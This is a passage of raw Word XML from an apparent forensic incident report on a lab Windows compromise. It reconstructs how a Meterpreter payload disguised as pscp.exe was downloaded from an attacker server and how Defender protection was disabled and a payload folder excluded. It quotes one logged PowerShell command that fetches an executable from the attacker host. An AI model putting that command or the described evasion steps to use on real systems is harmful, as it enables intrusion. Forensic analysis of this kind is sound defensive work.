            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36.111277 → 2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>FACTS (UTC). WebCache (Edge legacy / IE ESE, parsed by Dissect as browser=iexplore) for user medmondson:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 10:16:36.111 visit http://10.0.0.12/ and http://10.0.0.12:8080/ (directory listing of the attacker's HTTP server; dissect/browser.history.jsonl#49, #69, #85; iexplore.history #22/#42/#58).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 10:18:48.738 file:///C:/Payloads (local folder opened in Explorer, WebCache file:// entry; browser.history #31).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 10:19:49.380 http://10.0.0.12:8080/pscp.exe, visit_count 4 and 8 in the two containers (browser.history #68, #84; iexplore.history #41/#57) = repeated download attempts consistent with the 3 Defender 1116/1117 Meterpreter.E detections at 10:16:43/10:17:53/10:19:36 (F-003).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 10:19:53.882 download record url=http://10.0.0.12:8080/pscp.exe -&gt; C:\Users\medmondson\Downloads\pscp.exe (dissect/browser.downloads.jsonl#6, iexplore.downloads.jsonl#3) – the surviving copy (MFT 85774) after RTP was disabled at 10:19:46.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $MFT Zone.Identifier ADS: C:\$Recycle.Bin\S-1-5-21-...-1001\$RHOVDEL.exe:Zone.Identifier created 10:19:53.835 and C:\Payloads\pscp.exe:Zone.Identifier created 10:20:10.116, both 'ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe' (mft.csv#115197, #115204).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Payloads\test.exe (10:21:41) and C:\Users\medmondson\1.exe (11:10:55) carry no Zone.Identifier: they were fetched by PowerShell Invoke-WebRequest (4104 'wget http://10.0.0.12:8080/1.exe -o 1.exe' evtx#8814, 4103 Invoke-WebRequest #8815, Sysmon 3 powershell PID 736 10.0.0.124 -&gt; 10.0.0.12:8080 #18681), which does not write MOTW.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Sysmon EID 22 DNS query relates to 10.0.0.12 (direct IP, no domain). TypedURLs contain only the default go.microsoft.com link. No e-mail client data present in the collection (no Outlook/PST/OST artefacts parsed).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The delivery vector of the malicious executable is a direct HTTP download by the logged-on user, using the built-in Edge browser, from an attacker-controlled web server at 10.0.0.12:8080 on the same /24 LAN (host is 10.0.0.124). The referrer http://10.0.0.12:8080/ shows the user browsed the server index (typical 'python -m http.server'/Metasploit web delivery listing) and clicked pscp.exe. The masquerading name (PuTTY PSCP) is the lure. The download is corroborated by three independent sources: WebCache (history + downloads), NTFS ($MFT Zone.Identifier ADS) and Defender Operational log. The lab nature (user self-downloading from a Kali box) explains the absence of phishing/e-mail; no e-mail artefact was available, so e-mail delivery cannot be excluded but nothing points to it.</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10:16:36.111277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#69</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:49.380413</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/pscp.exe</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#68</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:49.380413</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/pscp.exe</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#84</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (downloads, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>download: ts_end</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>url=http://10.0.0.12:8080/pscp.exe | browser=iexplore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.downloads.jsonl#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Internet Explorer / WebCache (downloads)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>download: ts_end</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>url=http://10.0.0.12:8080/pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/iexplore.downloads.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:48.738766</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>file:///C:/Payloads</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</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C:\Payloads\pscp.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43.841943</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe</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evtxecmd/evtxecmd_0.csv#23714</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</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bl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.9 Defense evasion and anti-forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Defense evasion and anti-forensics review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Log integrity**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No Security 1102 or System 104 (Eventlog) events.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The 1100 events are pre-attack reboots.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- RecordIDs are contiguous in Security, System, Sysmon, PowerShell and Defender.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Time changes**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- 4616 and Kernel-General 1 appear only during OOBE on 2023-11-09.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Defender**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The 5007/5001 chain was already covered in F-004.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Added the registry state at collection to F-004 as corroboration: DisableRealtimeMonitoring=1, Exclusions\Paths\C:\Payloads\, SpyNet off.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- F-017 records the persisted state and how the RTP disable at 11:02:11 was done: through the Windows Security UI (consent.exe → SecurityHealthHost → MsMpEng, Sysmon 13), 57 s before pscp.exe ran.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Added T-016 and IOC I-016.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Timestomping**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- None on the attack files (pscp.exe, test.exe, 1.exe, $RHOVDEL.exe, not_my_pass.txt).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The files flagged SI&lt;FN are installers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Deletions and wiping**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No mass deletion, wiping tool, or Prefetch or EVTX deletion.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Recycle Bin items are the payload original and lab setup files.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**PowerShell logging**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Not disabled. The transcripts of the attack sessions are still on disk, and 4104 events are present.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Recorded as F-018 (info/probable, negative finding) plus a note on what was ruled out.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-017: Defense-evasion state at collection time: Defender RTP still disabled and C:\Payloads\ excluded (registry); RTP disabled via Windows Security UI 57 s before pscp.exe launch</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artifact:defender (exclusions)</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>defense-evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1562.001, T1564.012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452 → 2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SOFTWARE hive (RECmd Kroll), state at the KAPE collection (~12:33 UTC):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1, DpaDisabled = 0, key LastWrite 2023-11-10 11:02:11.5589591 (recmd_kroll_C.csv#1447).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ...\Windows Defender\Exclusions\Paths\C:\Payloads\ = 0, LastWrite 10:52:49.247 (#1456; Dissect defender.exclusions.jsonl#2). The LastWrite reflects the rewrite during the Defender platform update to 4.18.23100.2009-0 at 10:52:49; the exclusion was first created at 10:19:24.979 (Defender 5007 RecordID evtxecmd_0.csv#23724).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ...\Spynet\SpyNetReporting = 0 and SubmitSamplesConsent = 0 (#1443, #1444): cloud protection and sample submission stay disabled (5007 at 10:17:40/10:17:41).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sequence of the second RTP disable, from Sysmon: at 11:02:09.773 consent.exe (UAC, parent svchost Appinfo PID 6492) (#18635); SecurityHealthHost.exe -Embedding started at 11:02:11.357 (#18636); at 11:02:11.568 MsMpEng.exe (platform 4.18.23100.2009-0) wrote DisableRealtimeMonitoring=DWORD 1 (Sysmon 13, #18637); services.exe set WdNisDrv Start=3 (#18638); then Defender 5001 'Real-time protection disabled' at 11:02:12.401 (#23752). C:\Payloads\pscp.exe was launched 57 s later, at 11:03:09.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
